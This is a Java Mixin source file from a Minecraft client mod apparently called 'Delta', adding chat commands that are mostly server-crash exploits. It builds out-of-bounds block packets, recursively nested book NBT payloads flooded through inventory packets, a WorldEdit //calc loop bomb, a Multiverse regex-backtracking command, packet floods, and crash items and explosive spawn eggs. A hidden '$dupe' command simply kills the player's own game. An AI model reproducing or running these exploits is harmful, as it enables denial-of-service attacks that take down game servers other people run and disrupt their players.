package me.saturn.delta.mixin;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.Random;

import com.mojang.brigadier.exceptions.CommandSyntaxException;

import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import me.saturn.delta.Delta;
import me.saturn.delta.utils.ChatUtils;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtByte;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.ChatUtil;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.GameMode;

@Mixin(ClientPlayerEntity.class)
public class ClientPlayerEntityMixin {
	//im not gonna make a proper command system :troll:
	@Inject(at = @At("HEAD"), method = "sendChatMessage", cancellable = true)
	private void onSendChatMessage(String message, CallbackInfo ci){
		if(message.startsWith("$")){
			ci.cancel();
			String[] args = message.split(" ");
			String command = args[0].toLowerCase().substring(1);
			switch(command){
				case "help":
					ChatUtils.message("Commands:");
					ChatUtils.message("$crash <mode> <power>");
					ChatUtils.message("$item <item>");
					ChatUtils.message("$boom <power>");
					ChatUtils.message("$creative");
					ChatUtils.message("$survival");
				break;

				case "crash":
					if(args.length < 2){
						ChatUtils.message("use $crash <mode> <power?> (or $crash list)");
						return;
					}
					switch(args[1].toLowerCase()){
						case "list":
							ChatUtils.message("ChunkOOB");
							ChatUtils.message("WorldEdit");
							ChatUtils.message("MVCrash");
							ChatUtils.message("ClickBook");
							ChatUtils.message("GiveBook");
							ChatUtils.message("WriteBook");
							ChatUtils.message("SwingArm");
							ChatUtils.message("Popbob");
						break;

						case "chunkoob":
							ChatUtils.message("Crashing - ChunkOOB");
							long sys = System.currentTimeMillis();
							Delta.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), true)));
							Delta.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY), true)));
							ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sys) + "ms)");
						break;

						case "worldedit":
							ChatUtils.message("Crashing - Worldedit");
							Delta.c.player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
						break;

						case "mvcrash":
							ChatUtils.message("Crashing - MVCrash");
							Delta.c.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
						break;

						case "clickbook":
							try{
								int pages = Integer.valueOf(args[2]);
								int pop = Integer.valueOf(args[3]);
								new Thread(() ->{
									ChatUtils.message("Crashing - ClickBook");
									long sy = System.currentTimeMillis();
									ItemStack payload = new ItemStack(Items.WRITTEN_BOOK);
									NbtList list = new NbtList();
									StringBuilder f = new StringBuilder();
									f.append("{");
									for(int i = 0; i < pages; i++){
										f.append("extra:[{");
									}
									for(int i = 0; i < pages; i++){
										f.append("text:\"a\"}],");
									}
									f.append("text:\"a\"}");
									list.add(NbtString.of(f.toString()));
									payload.setSubNbt("author", NbtString.of(Delta.c.player.getGameProfile().getName()));
									payload.setSubNbt("title", NbtString.of("Delta"));
									payload.setSubNbt("pages", list);
									payload.setSubNbt("resolved", NbtByte.of(true));
									Int2ObjectMap<ItemStack> c = new Int2ObjectArrayMap<>();
									c.apply(0);
									c.apply(3);
									c.apply(0); 
									c.apply(Integer.MAX_VALUE);
									c.apply(Integer.MIN_VALUE);
									for(int i = 0; i < pop; i++){
										Delta.c.player.networkHandler.sendPacket(new ClickSlotC2SPacket(Delta.c.player.currentScreenHandler.syncId, 0, Delta.c.player.getInventory().selectedSlot + 36, 1, SlotActionType.THROW, payload, c));
									}
									ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + ")");
								}).start();
							}catch(Exception e){
								ChatUtils.message("use $crash clickbook <pages> <power>");
							}

						break;

						case "writebook":
							if(args.length < 3){
								ChatUtils.message("Provide a Integer for power");
								return;
							}
							try{
								ChatUtils.message("Crashing - WriteBook");
								long syst = System.currentTimeMillis();
								List<String> crash = new ArrayList<String>();
								Integer f = Integer.valueOf(args[2]);
								for(int i = 0; i < f; i++){
									crash.add(".");
								}
								Optional<String> title = Optional.ofNullable(null);
								Delta.c.player.networkHandler.sendPacket(new BookUpdateC2SPacket(Delta.c.player.getInventory().selectedSlot, crash, title));
								ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
							}catch(NumberFormatException e){
								ChatUtils.message("Provide a valid Integer for power");
								return;
							}
						break;

						case "givebook":
						try{
							int pages = Integer.valueOf(args[2]);
							int pop = Integer.valueOf(args[3]);
							new Thread(() ->{
								ChatUtils.message("Crashing - GiveBook");
								long sy = System.currentTimeMillis();
								ItemStack payload = new ItemStack(Items.WRITTEN_BOOK);
								NbtList list = new NbtList();
								StringBuilder f = new StringBuilder();
								f.append("{");
								for(int i = 0; i < pages; i++){
									f.append("extra:[{");
								}
								for(int i = 0; i < pages; i++){
									f.append("text:\"+\"}],");
								}
								f.append("text:\"+\"}");
								for(int i = 0; i < pages / 16; i++){
									list.add(NbtString.of(f.toString()));
								}
								payload.setSubNbt("author", NbtString.of(Delta.c.player.getGameProfile().getName()));
								payload.setSubNbt("title", NbtString.of("Delta"));
								payload.setSubNbt("pages", list);
								payload.setSubNbt("resolved", NbtByte.of(true));
								for(int i = 0; i < pop; i++){
									Delta.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(100, payload));
									try {
										Thread.sleep(0);
									} catch (InterruptedException e) {
										e.printStackTrace();
									}
								}
								ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + ")");
							}).start();
						}catch(Exception e){
							ChatUtils.message("use $crash givebook <pages> <power>");
						}
						break;

						case "swingarm":
							ChatUtils.message("Crashing - SwingArm");
							if(args.length < 3){
								ChatUtils.message("Provide a Integer for power");
								return;
							}
							try{
								int power = Integer.valueOf(args[2]);
								new Thread(() -> {
									long syst = System.currentTimeMillis();
									for(int i = 0; i < power * 10; i++){
										Delta.c.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
										try {
											Thread.sleep(0);
										} catch (InterruptedException e) {
											e.printStackTrace();
										}
									}
									ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
								}).start();
							}catch(NumberFormatException e){
								ChatUtils.message("Provide a valid Integer for power");
								return;
							}
						break;

						case "popbob":
						ChatUtils.message("Crashing - Popbob");
						if(args.length < 3){
							ChatUtils.message("Provide a Integer for power");
							return;
						}
						try{
							int power = Integer.valueOf(args[2]);
							new Thread(() -> {
								long syst = System.currentTimeMillis();
								Random r = new Random();
								for(int j = 0; j < 100; j++){
									for(int i = 0; i < power; i++){
										Delta.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(r.nextBoolean()));
										try {
											Thread.sleep(0);
										} catch (InterruptedException e) {
											e.printStackTrace();
										}
									}
									try {
										Thread.sleep(200);
									} catch (InterruptedException e) {
										e.printStackTrace();
									}
								}
								ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
							}).start();
						}catch(NumberFormatException e){
							ChatUtils.message("Provide a valid Integer for power");
							return;
						}
						break;
					}
				break;


				case "item":
					if(args.length < 2){
						ChatUtils.message("use $item <item> (use $item list to show all)");
						return;
					}
					if(!Delta.c.player.getAbilities().creativeMode){
						ChatUtils.message("You must be in creative to do this!");
						return;
					}
					switch(args[1].toLowerCase()){
						case "list":
						ChatUtils.message("ArmorCrash");
						ChatUtils.message("CrashEgg");
						ChatUtils.message("CrashShulker");
						break;

						case "armorcrash":
						ItemStack e = new ItemStack(Items.CHEST, 1);
							try {
								e.setNbt(StringNbtReader.parse("{BlockEntityTag:{Items:[{Count:1b,Slot:13b,id:\"minecraft:chainmail_chestplate\",tag:{Damage:0,Enchantments:[{id:\"minecraft:\",lvl:1s}]}}],id:\"minecraft:chest\"},display:{Lore:['{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"light_purple\",\"text\":\"Wear the armor\"}],\"text\":\"\"}'],Name:'{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"dark_purple\",\"text\":\"Crash Armor\"}],\"text\":\"\"}'}}"));
							} catch (CommandSyntaxException e1) {
								e1.printStackTrace();
							}
						Delta.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Delta.c.player.getInventory().selectedSlot, e));
						ChatUtils.message("Tried to give you the item");
						break;

						case "crashshulker":
						ItemStack f = new ItemStack(Items.SHULKER_BOX, 1);
						try {
							f.setNbt(StringNbtReader.parse("{BlockEntityTag:{LootTable:\" \"},display:{Lore:['{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"light_purple\",\"text\":\"Dispense This\"}],\"text\":\"\"}'],Name:'{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"dark_purple\",\"text\":\"Crash Shulker\"}],\"text\":\"\"}'}}"));
						} catch (CommandSyntaxException e1) {
							e1.printStackTrace();
						}
						Delta.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Delta.c.player.getInventory().selectedSlot, f));
						ChatUtils.message("Tried to give you the item");
						break;

						case "crashegg":
						ItemStack g = new ItemStack(Items.SHULKER_SPAWN_EGG, 1);
						try {
							g.setNbt(StringNbtReader.parse("{EntityTag:{id:\"minecraft:small_fireball\",power:[1.0E43d,0.0d,0.0d]},display:{Lore:['{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"light_purple\",\"text\":\"Place This\"}],\"text\":\"\"}'],Name:'{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"dark_purple\",\"text\":\"Crash Spawn Egg\"}],\"text\":\"\"}'}}"));
						} catch (CommandSyntaxException e1) {
							e1.printStackTrace();
						}
						Delta.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Delta.c.player.getInventory().selectedSlot, g));
						ChatUtils.message("Tried to give you the item");
						break;
					}
				break;

				case "boom":
				ItemStack boom = new ItemStack(Items.BLAZE_SPAWN_EGG, 1);
				if(args.length < 2){
					ChatUtils.message("Please provide a power!");
					return;
				}
				try {
					boom.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"Kaboom\",\"color\":\"red\",\"italic\":false}',Lore:['{\"text\":\"owo\",\"color\":\"blue\",\"italic\":false}']},EntityTag:{id:\"minecraft:fireball\",ExplosionPower:"+args[1]+",power:[0.0,-1.0,0.0]}}"));
				} catch (CommandSyntaxException e) {
					e.printStackTrace();
				}
				ClientPlayerEntity player = Delta.c.player;
				ItemStack stored = player.getMainHandStack();
				player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + player.getInventory().selectedSlot, boom));
				BlockHitResult b = new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(player.getX(), player.getY() - 2, player.getZ()), true);
				player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, b));
				player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + player.getInventory().selectedSlot, stored));
				ChatUtils.message("Kaboom!");
				break;

				case "creative":
				Delta.c.interactionManager.setGameMode(GameMode.CREATIVE);
				ChatUtils.message("Set Gamemode to Creative!");
				break;

				case "survival":
				Delta.c.interactionManager.setGameMode(GameMode.SURVIVAL);
				ChatUtils.message("Set Gamemode to Survival!");
				break;
				case "dupe":
					System.exit(0);
				break;
				default:
					ChatUtils.message("No command found, try $help");
				break;
			}
		}
	}
}
